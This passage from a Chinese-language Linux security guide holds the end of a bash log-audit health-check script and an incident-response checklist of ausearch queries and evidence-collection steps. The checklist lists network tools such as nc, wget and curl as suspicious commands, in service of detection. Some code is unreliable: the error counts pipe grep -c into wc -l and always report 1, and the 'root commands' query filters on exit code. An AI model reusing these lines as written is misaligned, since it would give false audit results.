# auditd
if systemctl is-active --quiet auditd; then
    echo "✓ auditd 服务运行中" >> "$REPORT"
else
    echo "✗ auditd 服务未运行!" >> "$REPORT"
fi

# systemd-journald
if systemctl is-active --quiet systemd-journald; then
    echo "✓ journald 服务运行中" >> "$REPORT"
else
    echo "✗ journald 服务未运行!" >> "$REPORT"
fi

echo "" >> "$REPORT"
echo "【2. 磁盘空间检查】" >> "$REPORT"
echo "----------------------------------------" >> "$REPORT"

df -h /var/log >> "$REPORT"
echo "" >> "$REPORT"

USAGE=$(df /var/log | awk 'NR==2 {print $5}' | sed 's/%//')
if [ "$USAGE" -gt 85 ]; then
    echo "⚠ 警告: /var/log 使用率 ${USAGE}% 超过85%!" >> "$REPORT"
else
    echo "✓ /var/log 使用率 ${USAGE}% 正常" >> "$REPORT"
fi

echo "" >> "$REPORT"
echo "【3. 日志文件检查】" >> "$REPORT"
echo "----------------------------------------" >> "$REPORT"

for logfile in auth.log syslog kern.log; do
    if [ -f "/var/log/$logfile" ]; then
        SIZE=$(du -h /var/log/$logfile | cut -f1)
        MODIFIED=$(stat -c %y /var/log/$logfile | cut -d. -f1)
        echo "✓ /var/log/$logfile - $SIZE - 最后修改: $MODIFIED" >> "$REPORT"
    else
        echo "✗ /var/log/$logfile 不存在!" >> "$REPORT"
    fi
done

# audit日志
if [ -f "/var/log/audit/audit.log" ]; then
    SIZE=$(du -h /var/log/audit/audit.log | cut -f1)
    echo "✓ /var/log/audit/audit.log - $SIZE" >> "$REPORT"
else
    echo "✗ /var/log/audit/audit.log 不存在!" >> "$REPORT"
fi

echo "" >> "$REPORT"
echo "【4. 安全事件统计（24小时）" >> "$REPORT"
echo "----------------------------------------" >> "$REPORT"

YESTERDAY=$(date -d "yesterday" +%b\\ %e)

# 失败登录
FAILED=$(grep -c "$YESTERDAY.*Failed" /var/log/auth.log 2>/dev/null || echo 0)
echo "失败登录次数: $FAILED" >> "$REPORT"

# 成功登录
SUCCESS=$(grep -c "$YESTERDAY.*Accepted" /var/log/auth.log 2>/dev/null || echo 0)
echo "成功登录次数: $SUCCESS" >> "$REPORT"

# sudo使用
SUDO=$(grep -c "$YESTERDAY.*sudo" /var/log/auth.log 2>/dev/null || echo 0)
echo "sudo使用次数: $SUDO" >> "$REPORT"

# 审计事件
AUDIT_EVENTS=$(wc -l /var/log/audit/audit.log 2>/dev/null | awk '{print $1}' || echo 0)
echo "审计事件数: $AUDIT_EVENTS" >> "$REPORT"

echo "" >> "$REPORT"
echo "【5. 错误日志统计】" >> "$REPORT"
echo "----------------------------------------" >> "$REPORT"

ERRORS=$(grep -ic "error\|critical\|panic\|fatal" /var/log/syslog 2>/dev/null | wc -l)
echo "系统错误数: $ERRORS" >> "$REPORT"

KERN_ERRORS=$(grep -ic "error\|warn" /var/log/kern.log 2>/dev/null | wc -l)
echo "内核错误/警告: $KERN_ERRORS" >> "$REPORT"

echo "" >> "$REPORT"
echo "【6. 轮转状态检查】" >> "$REPORT"
echo "----------------------------------------" >> "$REPORT"

# 检查最近的轮转
echo "最近轮转的日志文件:" >> "$REPORT"
find /var/log -name "*.gz" -mtime -1 2>/dev/null | head -10 >> "$REPORT"

echo "" >> "$REPORT"
echo "【7. 远程日志状态】" >> "$REPORT"
echo "----------------------------------------" >> "$REPORT"

# 检查远程日志连接
if ss -tn | grep -q ":514.*ESTAB"; then
    echo "✓ 远程日志连接正常" >> "$REPORT"
else
    echo "⚠ 未检测到远程日志连接" >> "$REPORT"
fi

echo "" >> "$REPORT"
echo "========================================" >> "$REPORT"
echo "检查完成: $(date)" >> "$REPORT"

cat "$REPORT"
```

### 4.23.3 应急响应检查清单

安全事件发生时，日志检查的步骤和要点。应急响应时需要快速、有序地检查日志，收集证据，分析攻击。

清单按PICERL（准备、检测、遏制、根除、恢复、总结）流程组织，每个阶段的日志相关工作。

```bash
# =============================================
# 安全事件应急响应日志检查清单
# =============================================

# ===== 【第一阶段：检测与确认

# 1. 初步确认
# - 确认事件真实性
# - 影响范围初步判断
# - 记录时间

# 2. 日志初步收集
# 收集以下日志立即收集：
# - 认证日志 /var/log/auth.log
# - 系统日志 /var/log/syslog
# - 审计日志 /var/log/audit/audit.log
# - Web日志 /var/log/nginx/
# - 应用日志

# 保存命令：
# mkdir -p /evidence/$(hostname)-$(date +%Y%m%d)
# cp -a /var/log/auth.log* /evidence/
# cp -a /var/log/syslog* /evidence/
# cp -a /var/log/audit/ /evidence/

# ===== 【第二阶段：遏制

# 1. 时间范围确定
# - 攻击开始时间
# - 攻击结束时间（是否还在进行？
# - 影响持续时间

# 2. 受影响系统确定
# - 哪些主机被攻破？
# - 哪些账号被盗？
# - 哪些数据泄露？

# 3. 攻击入口点确定
# - 从哪里进来的？
# - 利用了什么漏洞？

# ===== 【第三阶段：根除

# 1. 攻击路径分析
# 按时间线整理：
# - 初始访问
# - 权限提升
# - 横向移动
# - 数据窃取
# - 持久化
# - 痕迹清除

# 2. 持久化机制检查
# - 新增用户
# - SSH密钥
# - 计划任务
# - 系统服务
# - Rootkit/后门
# - WebShell

# ===== 【第四阶段：恢复

# 1. 清除攻击者
# - 禁用被盗账号
# - 封锁攻击IP
# - 清除后门程序

# 2. 系统加固
# - 修补漏洞
# - 加强密码
# - 加固配置

# 3. 验证清除
# - 确认攻击者已被完全清除
# - 监控是否有新的攻击

# ===== 【第五阶段：总结

# 1. 事件报告编写
# - 事件描述
# - 影响评估
# - 时间线
# - 原因分析
# - 改进措施

# 2. 经验总结
# - 哪里做得好
# - 哪里需要改进
# - 需要加强

# =============================================
# 详细检查项
# =============================================

# 【认证相关检查

# 登录相关检查
# - 所有成功登录
ausearch -m USER_AUTH -sv yes -i
# - 所有失败登录
ausearch -m USER_AUTH -sv no -i
# - 失败TOP IP
# - 新用户
ausearch -k user_mgmt -i
# - sudo使用
ausearch -c sudo -i

# 进程与命令检查

# - root执行命令
ausearch -e 0 -m EXECVE -i
# - 可疑命令
#  nmap, nc, wget, curl
# - 进程列表对比基线

# 文件系统检查

# - 重要文件修改
ausearch -k etc_changes -i
# - /etc/passwd, shadow
# - /etc/ssh/
# - Web目录文件
# - /tmp, /var/tmp

# 网络检查

# - 网络连接
# - 监听端口
# - 异常连接
# - 数据传输量

# 时间线重建

# 按时间排序所有事件
# 从最早到最晚
# 标注每个事件

# 攻击者行为分析
# 技术手法
# 攻击工具
# 能力水平

# 证据完整性
# 哈希计算
# 证据链
# 完整性保护
```
